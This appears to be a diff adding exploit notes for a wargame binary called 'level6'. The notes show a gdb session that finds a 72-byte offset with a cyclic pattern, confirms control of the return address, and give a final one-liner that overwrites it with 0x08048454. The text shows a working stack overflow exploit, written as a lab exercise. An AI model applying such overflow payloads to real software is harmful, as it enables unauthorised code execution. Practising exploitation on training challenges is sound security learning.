@@ -1,0 +1,18 @@
+
+Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41346341 in ?? ()
+
+print (char[4])0x41346341
+$6 = "Ac4A"
+
+**
+** OFFSET 72
+**
+
+(gdb) r $(python -c 'print "A"*72 + "BBBB"')
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+./level6 $(python -c 'print "A"*72 + "\x08\x04\x84\x54"[::-1]')
